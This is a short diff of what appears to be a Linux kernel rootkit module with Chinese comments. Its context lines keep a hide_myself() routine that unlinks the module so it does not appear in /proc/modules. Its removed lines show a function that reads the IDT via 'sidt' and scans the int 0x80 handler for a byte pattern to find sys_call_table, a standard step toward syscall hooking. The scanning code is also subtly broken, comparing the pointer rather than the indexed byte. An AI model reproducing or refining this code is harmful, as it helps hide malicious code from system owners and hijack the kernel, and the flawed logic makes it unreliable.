@@ -53,6 +53,7 @@ static inline void module_info(void)
 {
     prev = THIS_MODULE->list.prev;
 }
+
 static void hide_myself(void)
 {
     // 摘除链表，/proc/modules中不可见
@@ -63,36 +64,4 @@ static void hide_myself(void)
 
     list_add(&THIS_MODULE->list, prev);
     // kobject_put(&mod.mkobj.kobj);
-}
-
-// 查找sys_call_table地址函数定义
-static void
-disp_sys_call_table(void)
-{
-    unsigned int sys_call_off;
-    unsigned int sys_call_table;
-    char *p;
-    int i;
-
-    // 获取中断描述符寄存器地址
-    asm("sidt %0"
-        : "=m"(idtr));
-    printk("addr of idtr:%x\n", &idtr);
-
-    // 获取0x80中断处理程序的地址
-    memcpy(&idt, idtr.base + 8 * 0x80, sizeof(idt));
-    sys_call_off = ((idt.off2 << 16) | idt.off1);
-    printk("addr of idt 0x80: %x\n", sys_call_off);
-
-    // 从0x80中断服务例程中搜索sys_call_table的地址
-    p = sys_call_off;
-    for (i = 0; i < 100; i++)
-    {
-        if (p == '\xff' && p[i + 1] == '\x14' && p[i + 2] == '\x85')
-        {
-            sys_call_table = *(unsigned int *)(p + i + 3);
-            printk("addr of sys_call_table: %x\n", sys_call_table);
-            return;
-        }
-    }
 }
